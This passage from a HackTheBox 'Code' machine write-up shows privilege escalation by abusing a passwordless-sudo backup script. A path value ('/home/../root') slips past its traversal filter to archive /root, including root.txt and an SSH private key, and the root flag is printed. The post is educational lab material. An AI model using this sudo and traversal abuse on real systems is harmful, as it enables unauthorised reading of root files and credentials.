<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">martin@code:~$ ls
</span></span><span class="line"><span class="cl">backups  root
</span></span><span class="line"><span class="cl">martin@code:~$ <span class="nb">cd</span> root/
</span></span><span class="line"><span class="cl">martin@code:~/root$ 
</span></span><span class="line"><span class="cl">martin@code:~/root$ ls 
</span></span><span class="line"><span class="cl">scripts
</span></span><span class="line"><span class="cl">martin@code:~/root$ ll
</span></span><span class="line"><span class="cl">total <span class="m">36</span>
</span></span><span class="line"><span class="cl">drwx------ <span class="m">6</span> martin martin <span class="m">4096</span> Aug  <span class="m">5</span> 20:30 ./
</span></span><span class="line"><span class="cl">drwxr-x--- <span class="m">7</span> martin martin <span class="m">4096</span> Aug  <span class="m">5</span> 20:30 ../
</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> martin martin    <span class="m">9</span> Jul <span class="m">27</span>  <span class="m">2024</span> .bash_history -&gt; /dev/null
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> martin martin <span class="m">3106</span> Dec  <span class="m">5</span>  <span class="m">2019</span> .bashrc
</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> martin martin <span class="m">4096</span> Aug  <span class="m">5</span> 20:30 .cache/
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> martin martin <span class="m">4096</span> Jul <span class="m">27</span>  <span class="m">2024</span> .local/
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> martin martin  <span class="m">161</span> Dec  <span class="m">5</span>  <span class="m">2019</span> .profile
</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> martin martin    <span class="m">9</span> Jul <span class="m">27</span>  <span class="m">2024</span> .python_history -&gt; /dev/null
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> martin martin <span class="m">4096</span> Aug  <span class="m">5</span> 20:30 scripts/
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> martin martin   <span class="m">66</span> Apr  <span class="m">9</span> 11:27 .selected_editor
</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> martin martin    <span class="m">9</span> Jul <span class="m">27</span>  <span class="m">2024</span> .sqlite_history -&gt; /dev/null
</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> martin martin <span class="m">4096</span> Aug  <span class="m">5</span> 20:30 .ssh/
</span></span><span class="line"><span class="cl">martin@code:~/root$ <span class="nb">cd</span> scripts/
</span></span><span class="line"><span class="cl">martin@code:~/root/scripts$ ls
</span></span><span class="line"><span class="cl">backups
</span></span><span class="line"><span class="cl">martin@code:~/root/scripts$ ls -lah
</span></span><span class="line"><span class="cl">total 12K
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> martin martin 4.0K Aug  <span class="m">5</span> 20:30 .
</span></span><span class="line"><span class="cl">drwx------ <span class="m">6</span> martin martin 4.0K Aug  <span class="m">5</span> 20:30 ..
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> martin martin 4.0K Aug  <span class="m">5</span> 20:30 backups
</span></span><span class="line"><span class="cl">martin@code:~/root/scripts$ <span class="nb">cd</span> backups/
</span></span><span class="line"><span class="cl">martin@code:~/root/scripts/backups$ ls -lah
</span></span><span class="line"><span class="cl">total 8.0K
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> martin martin 4.0K Aug  <span class="m">5</span> 20:30 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> martin martin 4.0K Aug  <span class="m">5</span> 20:30 ..
</span></span></code></pre></div><p>I ran the <strong><code>sudo -l</code></strong> command to check which commands Martin can execute with sudo privileges and without needing a password.</p>
<p>The output revealed that Martin can run the script <strong><code>/usr/bin/backy.sh</code></strong> as any user, including root:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">martin@code:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> martin on localhost:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User martin may run the following commands on localhost:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/backy.sh
</span></span></code></pre></div><p>it possible to backup files outside of <strong><code>/var/ and /home/</code></strong> using <a href="http://backy.sh/"><strong><code>backy.sh</code></strong></a> This means the script could potentially be exploited for <strong>privilege escalation</strong>, depending on how it‚Äôs written and what commands it runs. My next step is to **inspect the contents of <code>backy.sh</code>**to look for any exploitable behavior.</p>
<p><img src="image%205.png" alt="image.png"></p>
<p>My initial idea was to edit <strong><code>/usr/bin/backy.sh</code></strong> to include a path to <strong><code>/root</code></strong>, which could potentially allow me to access restricted files like <strong><code>root.txt</code></strong>.</p>
<p>However, upon checking the file permissions:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">martin@code:~/backups$ ls -lah /usr/bin/backy.sh
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">926</span> Sep <span class="m">16</span>  <span class="m">2024</span> /usr/bin/backy.sh
</span></span></code></pre></div><p>I realized the file is owned by root and not writable by Martin, meaning I don‚Äôt have the necessary permissions to modify it directly.
So instead, I‚Äôll analyze the script for any exploitable behavior, such as calling other scripts, binaries, or using wildcard expansion unsafely.</p>
<p>While analyzing the <strong><code>/usr/bin/backy.sh</code></strong> script, I discovered that it expects a JSON input file as an argument ‚Äî specifically something like <strong><code>task.json</code></strong>.</p>
<p>The script reads and sanitizes the JSON input to prevent directory traversal <strong><code>(../)</code></strong>, validates that all paths fall under either <strong><code>/var/</code> or <code>/home/</code></strong>, and finally calls <strong><code>/usr/bin/backy.sh</code></strong> to process the input.</p>
<p>It doesn‚Äôt hardcode the input file ‚Äî instead, it takes a user-supplied JSON file, meaning I can pass my own file to control what gets processed.</p>
<p>The next step is to:</p>
<ol>
<li>Locate the actual <strong><code>task.json</code></strong> file in <strong><code>/home/backup/</code></strong>.</li>
<li>Check its permissions ‚Äî if Martin can read or write to it.</li>
<li>If writable, edit the JSON contents to point to a path I control (within /home/), and insert a payload or malicious command.</li>
</ol>
<p>This could give me a way to execute code or access restricted files via the <a href="http://backy.sh/">backy.sh</a> script, which runs with sudo privileges.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">martin@code:~$ cat backups/task.json 
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;destination&#34;</span>: <span class="s2">&#34;/home/martin/backups/&#34;</span>,
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;multiprocessing&#34;</span>: true,
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;verbose_log&#34;</span>: false,
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;directories_to_archive&#34;</span>: <span class="o">[</span>
</span></span><span class="line"><span class="cl">		<span class="s2">&#34;/home/app-production/app&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="o">]</span>,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="s2">&#34;exclude&#34;</span>: <span class="o">[</span>
</span></span><span class="line"><span class="cl">		<span class="s2">&#34;.*&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">martin@code:~$ ls -lah backups/task.json 
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> martin martin <span class="m">181</span> Aug  <span class="m">6</span> 08:50 backups/task.json
</span></span><span class="line"><span class="cl">martin@code:~$ 
</span></span></code></pre></div><p>edited the task.json file</p>
<p><img src="image%206.png" alt="image.png"></p>
<p>I edited the <strong><code>task.json</code></strong> file locally on my machine to include the desired payload or directory path.</p>
<p>Then, on the target machine, I <strong><code>removed the original task.json</code></strong> located in <strong><code>/home/backup/</code></strong> and used <strong><code>wget</code></strong> to download my modified version from my local machine, which was serving the file via a <strong><code>Python HTTP server.</code></strong></p>
<p><img src="image%207.png" alt="image.png"></p>
<p>The modified <strong><code>task.json</code></strong> worked as intended ‚Äî when executed with <strong><code>sudo /usr/bin/backy.sh</code></strong>, the script successfully bypassed the <strong><code>../</code></strong> filter and created a backup of the <strong><code>/root</code></strong> directory inside the <strong><code>/tmp</code></strong> directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">martin@code:~/backups$ sudo /usr/bin/backy.sh task.json 
</span></span><span class="line"><span class="cl">2025/08/06 18:24:12 üçÄ backy 1.2
</span></span><span class="line"><span class="cl">2025/08/06 18:24:12 üìã Working with task.json ...
</span></span><span class="line"><span class="cl">2025/08/06 18:24:12 üí§ Nothing to sync
</span></span><span class="line"><span class="cl">2025/08/06 18:24:12 üì§ Archiving: <span class="o">[</span>/home/../root<span class="o">]</span>
</span></span><span class="line"><span class="cl">2025/08/06 18:24:12 üì• To: /tmp ...
</span></span><span class="line"><span class="cl">2025/08/06 18:24:12 üì¶
</span></span><span class="line"><span class="cl">tar: Removing leading <span class="sb">`</span>/home/../<span class="err">&#39;</span> from member names
</span></span><span class="line"><span class="cl">/home/../root/
</span></span><span class="line"><span class="cl">/home/../root/.local/
</span></span><span class="line"><span class="cl">/home/../root/.local/share/
</span></span><span class="line"><span class="cl">/home/../root/.local/share/nano/
</span></span><span class="line"><span class="cl">/home/../root/.local/share/nano/search_history
</span></span><span class="line"><span class="cl">/home/../root/.selected_editor
</span></span><span class="line"><span class="cl">/home/../root/.sqlite_history
</span></span><span class="line"><span class="cl">/home/../root/.profile
</span></span><span class="line"><span class="cl">/home/../root/scripts/
</span></span><span class="line"><span class="cl">/home/../root/scripts/cleanup.sh
</span></span><span class="line"><span class="cl">/home/../root/scripts/backups/
</span></span><span class="line"><span class="cl">/home/../root/scripts/backups/task.json
</span></span><span class="line"><span class="cl">/home/../root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
</span></span><span class="line"><span class="cl">/home/../root/scripts/database.db
</span></span><span class="line"><span class="cl">/home/../root/scripts/cleanup2.sh
</span></span><span class="line"><span class="cl">/home/../root/.python_history
</span></span><span class="line"><span class="cl">/home/../root/root.txt
</span></span><span class="line"><span class="cl">/home/../root/.cache/
</span></span><span class="line"><span class="cl">/home/../root/.cache/motd.legal-displayed
</span></span><span class="line"><span class="cl">/home/../root/.ssh/
</span></span><span class="line"><span class="cl">/home/../root/.ssh/id_rsa
</span></span><span class="line"><span class="cl">/home/../root/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">/home/../root/.bash_history
</span></span><span class="line"><span class="cl">/home/../root/.bashrc
</span></span></code></pre></div><p>I navigated to the <strong><code>/tmp directory</code></strong> and found the backup file: <strong><code>code_home_.._root_2025_August.tar.bz2</code></strong></p>
<p>I extracted its contents.
After extracting it, I moved into the resulting <strong><code>root</code></strong> folder ‚Äî and there it was: the <strong><code>root.txt</code></strong> file, containing the final flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">martin@code:~/backups$ <span class="nb">cd</span> /tmp
</span></span><span class="line"><span class="cl">martin@code:/tmp$ ls
</span></span><span class="line"><span class="cl">code_home_.._root_2025_August.tar.bz2
</span></span><span class="line"><span class="cl">martin@code:/tmp$ tar -xvjf code_home_.._root_2025_August.tar.bz2 
</span></span><span class="line"><span class="cl">root/
</span></span><span class="line"><span class="cl">root/.local/
</span></span><span class="line"><span class="cl">root/.local/share/
</span></span><span class="line"><span class="cl">root/.local/share/nano/
</span></span><span class="line"><span class="cl">root/.local/share/nano/search_history
</span></span><span class="line"><span class="cl">root/.selected_editor
</span></span><span class="line"><span class="cl">root/.sqlite_history
</span></span><span class="line"><span class="cl">root/.profile
</span></span><span class="line"><span class="cl">root/scripts/
</span></span><span class="line"><span class="cl">root/scripts/cleanup.sh
</span></span><span class="line"><span class="cl">root/scripts/backups/
</span></span><span class="line"><span class="cl">root/scripts/backups/task.json
</span></span><span class="line"><span class="cl">root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
</span></span><span class="line"><span class="cl">root/scripts/database.db
</span></span><span class="line"><span class="cl">root/scripts/cleanup2.sh
</span></span><span class="line"><span class="cl">root/.python_history
</span></span><span class="line"><span class="cl">root/root.txt
</span></span><span class="line"><span class="cl">root/.cache/
</span></span><span class="line"><span class="cl">root/.cache/motd.legal-displayed
</span></span><span class="line"><span class="cl">root/.ssh/
</span></span><span class="line"><span class="cl">root/.ssh/id_rsa
</span></span><span class="line"><span class="cl">root/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">root/.bash_history
</span></span><span class="line"><span class="cl">root/.bashrc
</span></span><span class="line"><span class="cl">martin@code:/tmp$ ls
</span></span><span class="line"><span class="cl">code_home_.._root_2025_August.tar.bz2  root
</span></span><span class="line"><span class="cl">martin@code:/tmp$ <span class="nb">cd</span> root
</span></span><span class="line"><span class="cl">martin@code:/tmp/root$ ls
</span></span><span class="line"><span class="cl">root.txt  scripts
</span></span><span class="line"><span class="cl">martin@code:/tmp/root$ cat root.txt 
</span></span><span class="line"><span class="cl">a3d70f994471d7260c41e9d3cac8959b
</span></span><span class="line"><span class="cl">martin@code:/tmp/root$ 
</span></span></code></pre></div><p>Root flag : <strong><code>a3d70f994471d7260c41e9d3cac8959b</code></strong></p>

      </div>

      
        <footer class="post-footer">
          <div class="post-tags-footer">
            <span class="tags-label">Tags:</span>
            
              <a href="/tags/hackthebox" class="post-tag">HackTheBox</a>
            
              <a href="/tags/active-directory" class="post-tag">Active Directory</a>
            
              <a href="/tags/smb" class="post-tag">SMB</a>
            
              <a href="/tags/ntlm" class="post-tag">NTLM</a>
            
              <a href="/tags/privilege-escalation" class="post-tag">Privilege Escalation</a>
            
          </div>
        </footer>
      


      <nav class="post-navigation" aria-label="Post navigation">
        
          <a
            href="/machines/dog/"
            class="nav-link nav-prev"
            aria-label="Previous post: Dog">
            <span class="nav-label">Previous</span>
            <span class="nav-title">Dog</span>
          </a>
        

        
          <a
            href="/machines/artificial/"
            class="nav-link nav-next"
            aria-label="Next post: Artificial">
            <span class="nav-label">Next</span>
            <span class="nav-title">Artificial</span>
          </a>
        
      </nav>
    </article>

    
  <aside class="post-toc" id="post-toc" aria-label="Table of contents">
    <button
      class="toc-toggle"
      id="toc-toggle"
      aria-expanded="true"
      aria-controls="toc-content"
      aria-label="Toggle table of contents">
      <svg
        class="toc-burger-icon"
        viewBox="0 0 24 24"
        fill="none"
        stroke="currentColor"
        stroke-width="2"
        stroke-linecap="round"
        stroke-linejoin="round"
        aria-hidden="true">
        <line x1="3" y1="6" x2="21" y2="6"></line>
        <line x1="3" y1="12" x2="21" y2="12"></line>
        <line x1="3" y1="18" x2="21" y2="18"></line>
      </svg>
      <span class="toc-toggle-text">Table of Contents</span>
      <svg
        class="toc-chevron-icon"
        viewBox="0 0 24 24"
        fill="none"
        stroke="currentColor"
        stroke-width="2"
        stroke-linecap="round"
        stroke-linejoin="round"
        aria-hidden="true">
        <polyline points="6 9 12 15 18 9"></polyline>
      </svg>
    </button>
    <div class="toc-content" id="toc-content">
      <nav class="toc-nav" aria-label="Table of contents">
        <nav id="TableOfContents">
  <ul>
    <li><a href="#code">Code</a></li>
    <li><a href="#machine-info-">Machine info :</a></li>
    <li><a href="#pinging-">Pinging :</a></li>
    <li><a href="#nmap-scan-">Nmap Scan :</a>
      <ul>
        <li><a href="#port-5000">Port 5000:</a></li>
      </ul>
    </li>
    <li><a href="#exploitation-">Exploitation :</a></li>
    <li><a href="#user-flag">User Flag</a></li>
    <li><a href="#root-flag">Root Flag</a>
      <ul>
        <li><a href="#hash-crack">hash crack</a></li>
      </ul>
    </li>
  </ul>
</nav>
      </nav>
    </div>
  </aside>


  </div>

    </main>

    <footer>
      <footer class="site-footer">
  <div class="footer-content">
    <p class="footer-text">
      &copy;
      
      2026
      
      Bukhari&#39;s Archive.
      
    </p>
    
      <div class="footer-social">
        <div class="social-links">
  
    <a
      href="https://github.com/B3TA-BLOCKER"
      target="_blank"
      rel="noopener noreferrer"
      class="social-link"
      aria-label="GitHub">
      <svg fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
        <path
          fill-rule="evenodd"
          d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z"
          clip-rule="evenodd"></path>
      </svg>
    </a>
  

  
    <a
      href="https://www.linkedin.com/in/hassaan-ali-bukhari/"
      target="_blank"
      rel="noopener noreferrer"
      class="social-link"
      aria-label="LinkedIn">
      <svg fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
        <path
          d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path>
      </svg>
    </a>
  

  
    <a href="mailto:yourmail@example.com" class="social-link" aria-label="Email">
      <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
        <path
          stroke-linecap="round"
          stroke-linejoin="round"
          stroke-width="2"
          d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
      </svg>
    </a>
  
</div>

      </div>
    
  </div>
</footer>

    </footer>

    <div id="search-modal" class="search-modal" aria-hidden="true" role="dialog" aria-label="Search">
  <div class="search-modal-backdrop" id="search-modal-backdrop"></div>
  <div class="search-modal-container">
    <div class="search-input-wrapper">
      <svg class="search-input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path
          stroke-linecap="round"
          stroke-linejoin="round"
          stroke-width="2"
          d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
      </svg>
      <input
        type="search"
        id="search-input"
        class="search-input"
        placeholder="Search..."
        autocomplete="off"
        aria-label="Search input">
      <button class="search-input-clear" id="search-input-clear" aria-label="Clear search">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
        </svg>
      </button>
      <button class="search-modal-close" id="search-modal-close" aria-label="Close search">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M6 18L18 6M6 6l12 12"></path>
        </svg>
      </button>
    </div>
    <div id="search-results" class="search-results"></div>
  </div>
</div>

    

    <button id="scroll-to-top" class="scroll-to-top" aria-label="Scroll to top" type="button">
  <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
    <path
      stroke-linecap="round"
      stroke-linejoin="round"
      stroke-width="2"
      d="M5 10l7-7m0 0l7 7m-7-7v18"></path>
  </svg>
</button>


    










<script src="/js/main.min.cdc6a3c4f498c0556bc507848c493a55af2da9b14233c21300b240b89857180d.js" defer></script>

  </body>
</html>
